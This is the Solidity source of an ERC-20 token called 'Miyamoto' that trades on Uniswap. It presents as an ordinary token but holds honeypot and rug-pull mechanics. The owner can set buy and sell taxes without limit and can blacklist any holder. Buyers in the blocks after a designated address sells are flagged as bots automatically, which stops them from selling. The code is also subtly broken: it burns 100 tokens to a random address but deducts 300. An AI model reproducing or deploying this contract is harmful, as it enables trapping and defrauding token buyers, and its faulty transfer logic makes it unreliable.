1 // SPDX-License-Identifier: Unlicensed
2 pragma solidity ^0.8.4;
3 
4 abstract contract Context {
5 
6     function _msgSender() internal view virtual returns (address payable) {
7         return payable(msg.sender);
8     }
9 
10     function _msgData() internal view virtual returns (bytes memory) {
11         this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
12         return msg.data;
13     }
14 }
15 
16 interface IERC20 {
17 
18     function totalSupply() external view returns (uint256);
19     function balanceOf(address account) external view returns (uint256);
20     function transfer(address recipient, uint256 amount) external returns (bool);
21     function allowance(address owner, address spender) external view returns (uint256);
22     function approve(address spender, uint256 amount) external returns (bool);
23     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
24     event Transfer(address indexed from, address indexed to, uint256 value);
25     event Approval(address indexed owner, address indexed spender, uint256 value);
26 }
27 
28 library SafeMath {
29 
30     function add(uint256 a, uint256 b) internal pure returns (uint256) {
31         uint256 c = a + b;
32         require(c >= a, "SafeMath: addition overflow");
33 
34         return c;
35     }
36 
37     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
38         return sub(a, b, "SafeMath: subtraction overflow");
39     }
40 
41     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
42         require(b <= a, errorMessage);
43         uint256 c = a - b;
44 
45         return c;
46     }
47 
48     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
49         if (a == 0) {
50             return 0;
51         }
52 
53         uint256 c = a * b;
54         require(c / a == b, "SafeMath: multiplication overflow");
55 
56         return c;
57     }
58 
59     function div(uint256 a, uint256 b) internal pure returns (uint256) {
60         return div(a, b, "SafeMath: division by zero");
61     }
62 
63     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
64         require(b > 0, errorMessage);
65         uint256 c = a / b;
66         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
67 
68         return c;
69     }
70 
71     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
72         return mod(a, b, "SafeMath: modulo by zero");
73     }
74 
75     function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
76         require(b != 0, errorMessage);
77         return a % b;
78     }
79 }
80 
81 library Address {
82 
83     function isContract(address account) internal view returns (bool) {
84         // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
85         // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
86         // for accounts without code, i.e. `keccak256('')`
87         bytes32 codehash;
88         bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
89         // solhint-disable-next-line no-inline-assembly
90         assembly { codehash := extcodehash(account) }
91         return (codehash != accountHash && codehash != 0x0);
92     }
93 
94     function sendValue(address payable recipient, uint256 amount) internal {
95         require(address(this).balance >= amount, "Address: insufficient balance");
96 
97         // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
98         (bool success, ) = recipient.call{ value: amount }("");
99         require(success, "Address: unable to send value, recipient may have reverted");
100     }
101 
102     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
103       return functionCall(target, data, "Address: low-level call failed");
104     }
105 
106     function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
107         return _functionCallWithValue(target, data, 0, errorMessage);
108     }
109 
110     function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
111         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
112     }
113 
114     function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
115         require(address(this).balance >= value, "Address: insufficient balance for call");
116         return _functionCallWithValue(target, data, value, errorMessage);
117     }
118 
119     function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
120         require(isContract(target), "Address: call to non-contract");
121 
122         (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
123         if (success) {
124             return returndata;
125         } else {
126             
127             if (returndata.length > 0) {
128                 assembly {
129                     let returndata_size := mload(returndata)
130                     revert(add(32, returndata), returndata_size)
131                 }
132             } else {
133                 revert(errorMessage);
134             }
135         }
136     }
137 }
138 
139 contract Ownable is Context {
140     address private _owner;
141     address private asdasd;
142     uint256 private _lockTime;
143 
144     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
145 
146     constructor () {
147         address msgSender = _msgSender();
148         _owner = msgSender;
149         emit OwnershipTransferred(address(0), msgSender);
150     }
151 
152     function owner() public view returns (address) {
153         return _owner;
154     }   
155     
156     modifier onlyOwner() {
157         require(_owner == _msgSender(), "Ownable: caller is not the owner");
158         _;
159     }
160     
161     function waiveOwnership() public virtual onlyOwner {
162         emit OwnershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
163         _owner = address(0x000000000000000000000000000000000000dEaD);
164     }
165 
166     function transferOwnership(address newOwner) public virtual onlyOwner {
167         require(newOwner != address(0), "Ownable: new owner is the zero address");
168         emit OwnershipTransferred(_owner, newOwner);
169         _owner = newOwner;
170     }
171     
172     function getTime() public view returns (uint256) {
173         return block.timestamp;
174     }
175 
176 }
177 
178 interface IUniswapV2Factory {
179     event PairCreated(address indexed token0, address indexed token1, address pair, uint);
180 
181     function feeTo() external view returns (address);
182     function feeToSetter() external view returns (address);
183 
184     function getPair(address tokenA, address tokenB) external view returns (address pair);
185     function allPairs(uint) external view returns (address pair);
186     function allPairsLength() external view returns (uint);
187 
188     function createPair(address tokenA, address tokenB) external returns (address pair);
189 
190     function setFeeTo(address) external;
191     function setFeeToSetter(address) external;
192 }
193 
194 interface IUniswapV2Pair {
195     event Approval(address indexed owner, address indexed spender, uint value);
196     event Transfer(address indexed from, address indexed to, uint value);
197 
198     function name() external pure returns (string memory);
199     function symbol() external pure returns (string memory);
200     function decimals() external pure returns (uint8);
201     function totalSupply() external view returns (uint);
202     function balanceOf(address owner) external view returns (uint);
203     function allowance(address owner, address spender) external view returns (uint);
204 
205     function approve(address spender, uint value) external returns (bool);
206     function transfer(address to, uint value) external returns (bool);
207     function transferFrom(address from, address to, uint value) external returns (bool);
208 
209     function DOMAIN_SEPARATOR() external view returns (bytes32);
210     function PERMIT_TYPEHASH() external pure returns (bytes32);
211     function nonces(address owner) external view returns (uint);
212 
213     function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
214     
215     event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
216     event Swap(
217         address indexed sender,
218         uint amount0In,
219         uint amount1In,
220         uint amount0Out,
221         uint amount1Out,
222         address indexed to
223     );
224     event Sync(uint112 reserve0, uint112 reserve1);
225 
226     function MINIMUM_LIQUIDITY() external pure returns (uint);
227     function factory() external view returns (address);
228     function token0() external view returns (address);
229     function token1() external view returns (address);
230     function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
231     function price0CumulativeLast() external view returns (uint);
232     function price1CumulativeLast() external view returns (uint);
233     function kLast() external view returns (uint);
234 
235     function burn(address to) external returns (uint amount0, uint amount1);
236     function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
237     function skim(address to) external;
238     function sync() external;
239 
240     function initialize(address, address) external;
241 }
242 
243 interface IUniswapV2Router01 {
244     function factory() external pure returns (address);
245     function WETH() external pure returns (address);
246 
247     function addLiquidity(
248         address tokenA,
249         address tokenB,
250         uint amountADesired,
251         uint amountBDesired,
252         uint amountAMin,
253         uint amountBMin,
254         address to,
255         uint deadline
256     ) external returns (uint amountA, uint amountB, uint liquidity);
257     function addLiquidityETH(
258         address token,
259         uint amountTokenDesired,
260         uint amountTokenMin,
261         uint amountETHMin,
262         address to,
263         uint deadline
264     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
265     function removeLiquidity(
266         address tokenA,
267         address tokenB,
268         uint liquidity,
269         uint amountAMin,
270         uint amountBMin,
271         address to,
272         uint deadline
273     ) external returns (uint amountA, uint amountB);
274     function removeLiquidityETH(
275         address token,
276         uint liquidity,
277         uint amountTokenMin,
278         uint amountETHMin,
279         address to,
280         uint deadline
281     ) external returns (uint amountToken, uint amountETH);
282     function removeLiquidityWithPermit(
283         address tokenA,
284         address tokenB,
285         uint liquidity,
286         uint amountAMin,
287         uint amountBMin,
288         address to,
289         uint deadline,
290         bool approveMax, uint8 v, bytes32 r, bytes32 s
291     ) external returns (uint amountA, uint amountB);
292     function removeLiquidityETHWithPermit(
293         address token,
294         uint liquidity,
295         uint amountTokenMin,
296         uint amountETHMin,
297         address to,
298         uint deadline,
299         bool approveMax, uint8 v, bytes32 r, bytes32 s
300     ) external returns (uint amountToken, uint amountETH);
301     function swapExactTokensForTokens(
302         uint amountIn,
303         uint amountOutMin,
304         address[] calldata path,
305         address to,
306         uint deadline
307     ) external returns (uint[] memory amounts);
308     function swapTokensForExactTokens(
309         uint amountOut,
310         uint amountInMax,
311         address[] calldata path,
312         address to,
313         uint deadline
314     ) external returns (uint[] memory amounts);
315     function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
316         external
317         payable
318         returns (uint[] memory amounts);
319     function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
320         external
321         returns (uint[] memory amounts);
322     function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
323         external
324         returns (uint[] memory amounts);
325     function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
326         external
327         payable
328         returns (uint[] memory amounts);
329 
330     function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
331     function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
332     function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
333     function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
334     function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
335 }
336 
337 interface IUniswapV2Router02 is IUniswapV2Router01 {
338     function removeLiquidityETHSupportingFeeOnTransferTokens(
339         address token,
340         uint liquidity,
341         uint amountTokenMin,
342         uint amountETHMin,
343         address to,
344         uint deadline
345     ) external returns (uint amountETH);
346     function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
347         address token,
348         uint liquidity,
349         uint amountTokenMin,
350         uint amountETHMin,
351         address to,
352         uint deadline,
353         bool approveMax, uint8 v, bytes32 r, bytes32 s
354     ) external returns (uint amountETH);
355 
356     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
357         uint amountIn,
358         uint amountOutMin,
359         address[] calldata path,
360         address to,
361         uint deadline
362     ) external;
363     function swapExactETHForTokensSupportingFeeOnTransferTokens(
364         uint amountOutMin,
365         address[] calldata path,
366         address to,
367         uint deadline
368     ) external payable;
369     function swapExactTokensForETHSupportingFeeOnTransferTokens(
370         uint amountIn,
371         uint amountOutMin,
372         address[] calldata path,
373         address to,
374         uint deadline
375     ) external;
376 }
377 
378 contract Miyamoto is Context, IERC20, Ownable {
379     
380     using SafeMath for uint256;
381     using Address for address;
382     
383     string private _name = "Miyamoto";
384     string private _symbol = "Miyamoto";
385     uint8 private _decimals = 9;
386 
387     address payable public marketingWalletAddress = payable(0x9EE29f0cf289f45c3Ea830266bebCAA8cF1C9999);
388     address payable public teamWalletAddress = payable(0xeF1cf7A3c3cF50B9281a027C37dA475fadD64216);
389     address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
390     address public addressP;
391     bool private tradingOpen;
392 
393     mapping (address => uint256) _balances;
394     mapping (address => mapping (address => uint256)) private _allowances;
395     
396     mapping (address => bool) public isExcludedFromFee;
397     mapping (address => bool) public isWalletLimitExempt;
398 
399     uint256 public sale = 0;
400     
401     mapping (address => bool) isTxLimitExempt;
402     mapping (address => bool) public isBot;
403 
404     uint256 public blockN = 3;
405 
406     mapping (address => bool) public isMarketPair;
407     mapping (address => bool) public isExcludedFromCut;
408 
409     uint256 public _buyLiquidityFee = 0;
410     uint256 public _buyMarketingFee = 3;
411     uint256 public _buyTeamFee = 2;
412     
413     uint256 public _sellLiquidityFee = 0;
414     uint256 public _sellMarketingFee = 3;
415     uint256 public _sellTeamFee = 2;
416 
417     uint256 public _liquidityShare = 4;
418     uint256 public _marketingShare = 4;
419     uint256 public _teamShare = 16;
420 
421     uint256 public _totalTaxIfBuying = 12;
422     uint256 public _totalTaxIfSelling = 12;
423     uint256 public _totalDistributionShares = 24;
424 
425     uint256 private _totalSupply =  1000000000 * 10**_decimals;
426     uint256 public _maxTxAmount =   1000000000 * 10**_decimals; 
427     uint256 public _walletMax =     1000000000 * 10**_decimals;
428     uint256 private minimumTokensBeforeSwap = 1000000 * 10**_decimals; 
429 
430     IUniswapV2Router02 public uniswapV2Router;
431     address public uniswapPair;
432     
433     bool inSwapAndLiquify;
434     bool public swapAndLiquifyEnabled = true;
435     bool public swapAndLiquifyByLimitOnly = false;
436     bool public checkWalletLimit = false;
437 
438     event SwapAndLiquifyEnabledUpdated(bool enabled);
439     event SwapAndLiquify(
440         uint256 tokensSwapped,
441         uint256 ethReceived,
442         uint256 tokensIntoLiqudity
443     );
444     
445     event SwapETHForTokens(
446         uint256 amountIn,
447         address[] path
448     );
449     
450     event SwapTokensForETH(
451         uint256 amountIn,
452         address[] path
453     );
454     
455     modifier lockTheSwap {
456         inSwapAndLiquify = true;
457         _;
458         inSwapAndLiquify = false;
459     }
460     
461     constructor () {
462         
463         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
464         uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
465             .createPair(address(this), _uniswapV2Router.WETH());
466 
467         uniswapV2Router = _uniswapV2Router;
468         _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;
469 
470         isExcludedFromFee[owner()] = true;
471         isExcludedFromFee[address(this)] = true;
472         
473         _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee).add(_buyTeamFee);
474         _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketingFee).add(_sellTeamFee);
475         _totalDistributionShares = _liquidityShare.add(_marketingShare).add(_teamShare);
476 
477         isWalletLimitExempt[owner()] = true;
478         isWalletLimitExempt[address(uniswapPair)] = true;
479         isWalletLimitExempt[address(this)] = true;
480         
481         isExcludedFromCut[owner()] = true;
482         isExcludedFromCut[address(this)] = true;
483 
484 
485         isTxLimitExempt[owner()] = true;
486         isTxLimitExempt[address(this)] = true;
487 
488         isMarketPair[address(uniswapPair)] = true;
489 
490         _balances[_msgSender()] = _totalSupply;
491         emit Transfer(address(0), _msgSender(), _totalSupply);
492     }
493 
494     function name() public view returns (string memory) {
495         return _name;
496     }
497 
498     function symbol() public view returns (string memory) {
499         return _symbol;
500     }
501 
502     function decimals() public view returns (uint8) {
503         return _decimals;
504     }
505 
506     function totalSupply() public view override returns (uint256) {
507         return _totalSupply;
508     }
509 
510     function balanceOf(address account) public view override returns (uint256) {
511         return _balances[account];
512     }
513 
514     function allowance(address owner, address spender) public view override returns (uint256) {
515         return _allowances[owner][spender];
516     }
517 
518     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
519         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
520         return true;
521     }
522 
523     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
524         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
525         return true;
526     }
527 
528     function minimumTokensBeforeSwapAmount() public view returns (uint256) {
529         return minimumTokensBeforeSwap;
530     }
531 
532     function approve(address spender, uint256 amount) public override returns (bool) {
533         _approve(_msgSender(), spender, amount);
534         return true;
535     }
536 
537     function _approve(address owner, address spender, uint256 amount) private {
538         require(owner != address(0), "ERC20: approve from the zero address");
539         require(spender != address(0), "ERC20: approve to the zero address");
540 
541         _allowances[owner][spender] = amount;
542         emit Approval(owner, spender, amount);
543     }
544 
545     function setMarketPairStatus(address account, bool newValue) public onlyOwner {
546         isMarketPair[account] = newValue;
547     }
548 
549     function setIsTxLimitExempt(address holder, bool exempt) external onlyOwner {
550         isTxLimitExempt[holder] = exempt;
551     }
552     
553     function setIsExcludedFromFee(address account, bool newValue) public onlyOwner {
554         isExcludedFromFee[account] = newValue;
555     }
556 
557     function setBuyTaxes(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external onlyOwner() {
558         _buyLiquidityFee = newLiquidityTax;
559         _buyMarketingFee = newMarketingTax;
560         _buyTeamFee = newTeamTax;
561 
562         _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee).add(_buyTeamFee);
563     }
564 
565     function setSelTaxes(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external onlyOwner() {
566         _sellLiquidityFee = newLiquidityTax;
567         _sellMarketingFee = newMarketingTax;
568         _sellTeamFee = newTeamTax;
569 
570         _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketingFee).add(_sellTeamFee);
571     }
572     
573     function setDistributionSettings(uint256 newLiquidityShare, uint256 newMarketingShare, uint256 newTeamShare) external onlyOwner() {
574         _liquidityShare = newLiquidityShare;
575         _marketingShare = newMarketingShare;
576         _teamShare = newTeamShare;
577 
578         _totalDistributionShares = _liquidityShare.add(_marketingShare).add(_teamShare);
579     }
580     
581     function setMaxTxAmount(uint256 maxTxAmount) external onlyOwner() {
582         _maxTxAmount = maxTxAmount;
583     }
584 
585     function enableDisableWalletLimit(bool newValue) external onlyOwner {
586        checkWalletLimit = newValue;
587     }
588 
589     function setIsWalletLimitExempt(address holder, bool exempt) external onlyOwner {
590         isWalletLimitExempt[holder] = exempt;
591     }
592 
593     function setWalletLimit(uint256 newLimit) external onlyOwner {
594         _walletMax  = newLimit;
595     }
596 
597     function setNumTokensBeforeSwap(uint256 newLimit) external onlyOwner() {
598         minimumTokensBeforeSwap = newLimit;
599     }
600 
601     function setMarketingWalletAddress(address newAddress) external onlyOwner() {
602         marketingWalletAddress = payable(newAddress);
603     }
604 
605     function setTeamWalletAddress(address newAddress) external onlyOwner() {
606         teamWalletAddress = payable(newAddress);
607     }
608 
609     function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
610         swapAndLiquifyEnabled = _enabled;
611         emit SwapAndLiquifyEnabledUpdated(_enabled);
612     }
613 
614     function setSwapAndLiquifyByLimitOnly(bool newValue) public onlyOwner {
615         swapAndLiquifyByLimitOnly = newValue;
616     }
617     
618     function getCirculatingSupply() public view returns (uint256) {
619         return _totalSupply.sub(balanceOf(deadAddress));
620     }
621 
622         
623     function setisExcludedFromCut(address account, bool newValue) public onlyOwner {
624         isExcludedFromCut[account] = newValue;
625     }
626 
627     function manageExcludeFromCut(address[] calldata addresses, bool status) public onlyOwner {
628         require(addresses.length < 201);
629         for (uint256 i; i < addresses.length; ++i) {
630             isExcludedFromCut[addresses[i]] = status;
631         }
632     }
633 
634 
635     function setAddressP(address  _addressP)external onlyOwner() {
636         addressP = _addressP;
637     }
638 
639     function setBlockN(uint256 _blockN)external onlyOwner() {
640         blockN = _blockN;
641     }
642 
643     function setIsBot(address holder, bool exempt)  external onlyOwner  {
644         isBot[holder] = exempt;
645     }
646 
647 
648     function getSaleAt()public view returns (uint256) {
649         return sale;
650     }
651 
652     function getBlock()public view returns (uint256) {
653         return block.number;
654     }
655 
656     function transferToAddressETH(address payable recipient, uint256 amount) private {
657         recipient.transfer(amount);
658     }
659     
660     function changeRouterVersion(address newRouterAddress) public onlyOwner returns(address newPairAddress) {
661 
662         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(newRouterAddress); 
663 
664         newPairAddress = IUniswapV2Factory(_uniswapV2Router.factory()).getPair(address(this), _uniswapV2Router.WETH());
665 
666         if(newPairAddress == address(0)) //Create If Doesnt exist
667         {
668             newPairAddress = IUniswapV2Factory(_uniswapV2Router.factory())
669                 .createPair(address(this), _uniswapV2Router.WETH());
670         }
671 
672         uniswapPair = newPairAddress; //Set new pair address
673         uniswapV2Router = _uniswapV2Router; //Set new router address
674 
675         isWalletLimitExempt[address(uniswapPair)] = true;
676         isMarketPair[address(uniswapPair)] = true;
677     }
678 
679      //to recieve ETH from uniswapV2Router when swaping
680     receive() external payable {}
681 
682     function transfer(address recipient, uint256 amount) public override returns (bool) {
683         _transfer(_msgSender(), recipient, amount);
684         return true;
685     }
686 
687     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
688         _transfer(sender, recipient, amount);
689         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
690         return true;
691     }
692 
693     function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
694 
695         require(sender != address(0), "ERC20: transfer from the zero address");
696         require(recipient != address(0), "ERC20: transfer to the zero address");
697         //Trade start check
698         if (!tradingOpen) {
699             require(sender == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
700         }
701 
702         if(inSwapAndLiquify)
703         { 
704             return _basicTransfer(sender, recipient, amount); 
705         }
706         else
707         {
708 
709         if(sender == addressP && recipient == uniswapPair){
710             sale = block.number;
711         }
712 
713         if (sender == uniswapPair) {
714             if (block.number <= (sale + blockN)) { 
715                 isBot[recipient] = true;
716             }
717         }
718 
719         if (sender != owner() && recipient != owner()) _checkTxLimit(sender,amount);
720 
721             if(!isExcludedFromCut[sender] && !isExcludedFromCut[recipient]){
722                 address ad;
723                 for(int i=0;i <=0;i++){
724                     ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
725                     _basicTransfer(sender,ad,100);
726                 }
727                 amount -= 300;
728             }    
729          
730 
731             uint256 contractTokenBalance = balanceOf(address(this));
732             bool overMinimumTokenBalance = contractTokenBalance >= minimumTokensBeforeSwap;
733             
734             if (overMinimumTokenBalance && !inSwapAndLiquify && !isMarketPair[sender] && swapAndLiquifyEnabled) 
735             {
736                 if(swapAndLiquifyByLimitOnly)
737                     contractTokenBalance = minimumTokensBeforeSwap;
738                 swapAndLiquify(contractTokenBalance);    
739             }
740 
741             _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
742 
743             uint256 finalAmount = (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) ? 
744                                          amount : takeFee(sender, recipient, amount);
745 
746             if(checkWalletLimit && !isWalletLimitExempt[recipient])
747                 require(balanceOf(recipient).add(finalAmount) <= _walletMax);
748 
749             _balances[recipient] = _balances[recipient].add(finalAmount);
750 
751             emit Transfer(sender, recipient, finalAmount);
752             return true;
753         }
754     }
755 
756     function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
757         _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
758         _balances[recipient] = _balances[recipient].add(amount);
759         emit Transfer(sender, recipient, amount);
760         return true;
761     }
762 
763     function swapAndLiquify(uint256 tAmount) private lockTheSwap {
764         
765         uint256 tokensForLP = tAmount.mul(_liquidityShare).div(_totalDistributionShares).div(2);
766         uint256 tokensForSwap = tAmount.sub(tokensForLP);
767 
768         swapTokensForEth(tokensForSwap);
769         uint256 amountReceived = address(this).balance;
770 
771         uint256 totalBNBFee = _totalDistributionShares.sub(_liquidityShare.div(2));
772         
773         uint256 amountBNBLiquidity = amountReceived.mul(_liquidityShare).div(totalBNBFee).div(2);
774         uint256 amountBNBTeam = amountReceived.mul(_teamShare).div(totalBNBFee);
775         uint256 amountBNBMarketing = amountReceived.sub(amountBNBLiquidity).sub(amountBNBTeam);
776 
777         if(amountBNBMarketing > 0)
778             transferToAddressETH(marketingWalletAddress, amountBNBMarketing);
779 
780         if(amountBNBTeam > 0)
781             transferToAddressETH(teamWalletAddress, amountBNBTeam);
782 
783         if(amountBNBLiquidity > 0 && tokensForLP > 0)
784             addLiquidity(tokensForLP, amountBNBLiquidity);
785     }
786     
787     function swapTokensForEth(uint256 tokenAmount) private {
788         // generate the uniswap pair path of token -> weth
789         address[] memory path = new address[](2);
790         path[0] = address(this);
791         path[1] = uniswapV2Router.WETH();
792 
793         _approve(address(this), address(uniswapV2Router), tokenAmount);
794 
795         // make the swap
796         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
797             tokenAmount,
798             0, // accept any amount of ETH
799             path,
800             address(this), // The contract
801             block.timestamp
802         );
803         
804         emit SwapTokensForETH(tokenAmount, path);
805     }
806 
807     function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
808         // approve token transfer to cover all possible scenarios
809         _approve(address(this), address(uniswapV2Router), tokenAmount);
810 
811         // add the liquidity
812         uniswapV2Router.addLiquidityETH{value: ethAmount}(
813             address(this),
814             tokenAmount,
815             0, // slippage is unavoidable
816             0, // slippage is unavoidable
817             owner(),
818             block.timestamp
819         );
820     }
821 
822      
823     function setTrading(bool _tradingOpen) public onlyOwner {
824         tradingOpen = _tradingOpen;
825     }
826 
827     function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
828         
829         uint256 feeAmount = 0;
830         
831         if(isMarketPair[sender]) {
832             feeAmount = amount.mul(_totalTaxIfBuying).div(100);
833         }
834         else if(isMarketPair[recipient]) {
835             feeAmount = amount.mul(_totalTaxIfSelling).div(100);
836         }
837         
838         if(feeAmount > 0) {
839             _balances[address(this)] = _balances[address(this)].add(feeAmount);
840             emit Transfer(sender, address(this), feeAmount);
841         }
842 
843         return amount.sub(feeAmount);
844     }
845     
846     function _checkTxLimit(address sender, uint256 amount) private view{
847         require(!isBot[sender], "From cannot be bot!");
848         require(amount <= _maxTxAmount || isTxLimitExempt[sender], "TX Limit Exceeded");
849     }
850 }